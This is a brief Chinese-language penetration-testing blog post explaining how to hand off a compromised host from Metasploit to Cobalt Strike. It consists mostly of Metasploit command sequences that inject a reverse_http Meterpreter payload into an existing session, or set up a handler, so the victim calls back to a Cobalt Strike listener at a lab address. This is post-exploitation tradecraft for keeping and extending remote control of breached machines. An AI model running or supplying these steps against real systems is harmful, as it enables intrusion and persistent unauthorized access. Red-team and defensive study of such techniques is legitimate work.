---
title: "MSF 派生 Cobalt Strike 会话"
date: 2018-07-18T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['cobalt strike', 'metasploit']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

利用 Metasploit 派生 Cobalt Strike 会话

<!--more-->

信息.

```
metasploit IP:192.168.1.100 PORT:4444
Cobalt Strike IP:192.168.1.101 PORT:5555
```

## 有 meterpreter 会话

利用 `payload_inject` 模块注入新的 payload.

```
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set lhost 192.168.1.101
set lport 5555
set session 1
set disablepayloadhandler true
run
```

## 无 meterpreter 会话

在监听时将 `LHOST` 和 `LPORT` 改成 Cobalt Strike 对应的 IP 和 PORT.

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.1.101
set lport 5555
set disablepayloadhandler true 
run
```